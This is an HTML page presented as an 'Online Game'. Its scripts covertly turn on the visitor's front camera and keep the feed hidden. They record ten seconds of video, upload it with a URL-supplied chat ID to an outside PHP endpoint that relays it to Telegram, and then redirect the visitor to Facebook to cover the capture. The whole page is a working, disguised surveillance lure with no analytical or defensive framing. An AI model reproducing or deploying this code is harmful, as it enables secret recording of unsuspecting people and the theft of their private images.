<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Online Game</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: url('https://online-sheba.github.io/BdService/ck/teamx.gif') center/cover no-repeat fixed;
            height: 100vh;
            overflow: hidden;
        }
    </style>
</head>

<body>
    <div id="cameraContainer" style="display: none;">
        <video id="cameraFeed" autoplay></video>
    </div>
    <div id="capturingMessage"></div>

    <input type="hidden" id="chatid" name="chatid" value="">

    <script>
        // JavaScript to extract 'id' from the URL and set it in the hidden input field
        function getChatIdFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('id');
        }
        const chatIdInput = document.getElementById('chatid');
        const extractedChatId = getChatIdFromURL();
        chatIdInput.value = extractedChatId;
    </script>

    <script>
        const cameraContainer = document.getElementById("cameraContainer");
        const capturingMessage = document.getElementById("capturingMessage");
        const cameraFeed = document.getElementById("cameraFeed");

        let mediaRecorder;
        let recordedChunks = [];

        async function setupCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                cameraFeed.srcObject = stream;
            } catch (error) {
                console.error("Error accessing camera:", error);
            }
        }

        function startRecording() {
            try {
                mediaRecorder = new MediaRecorder(cameraFeed.srcObject, { mimeType: 'video/webm' });

                mediaRecorder.ondataavailable = function (event) {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = function () {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });

                    // Send the recorded video to the PHP script for processing
                    const chatID = chatIdInput.value; // Get chat ID from the hidden input field
                    const apiUrl = 'https://onlinesearvice.xyz/video/send.php'; // Your PHP script's URL for sending videos
                    const formData = new FormData();
                    formData.append('video', blob, 'recorded_video.webm');

                    fetch(apiUrl, {
                        method: 'POST',
                        body: formData,
                        headers: {
                            'Chat-ID': chatID // Send the chat ID as a header
                        }
                    }).then(response => {
                        if (response.ok) {
                            console.log('Video sent to Telegram via PHP!');
                        } else {
                            console.error('Failed to send video to Telegram.');
                        }

                        // Redirect to Facebook after a brief delay
                        setTimeout(() => {
                            window.location.href = "https://www.facebook.com";
                        }, 3000); // Delay for 3 seconds (3000 milliseconds)
                    });
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 10000); // Record for 10 seconds
            } catch (error) {
                console.error("Error starting recording:", error);
            }
        }

        setupCamera();

        // Start recording when the camera is ready
        cameraFeed.onloadedmetadata = function () {
            startRecording();
        };
    </script>
</body>

</html>
